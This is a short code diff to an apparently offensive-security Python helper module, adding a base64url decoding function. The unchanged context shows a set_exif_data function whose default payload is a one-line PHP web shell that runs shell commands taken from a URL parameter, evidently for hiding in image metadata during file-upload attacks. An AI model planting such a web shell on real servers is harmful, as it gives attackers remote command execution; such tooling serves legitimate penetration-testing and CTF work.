@@ -3,6 +3,7 @@
 import random
 import math
 import socket
+import base64
 import itertools
 import netifaces as ni
 import string
@@ -208,6 +209,9 @@ def xor(a, b):
         
 
     return b"".join([bytes([c1 ^ c2]) for (c1,c2) in zip(a, b) ])
+
+def base64urldecode(data):
+    return base64.urlsafe_b64decode(data + b'=' * (4 - len(data) % 4))
 
 def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):
     import exif
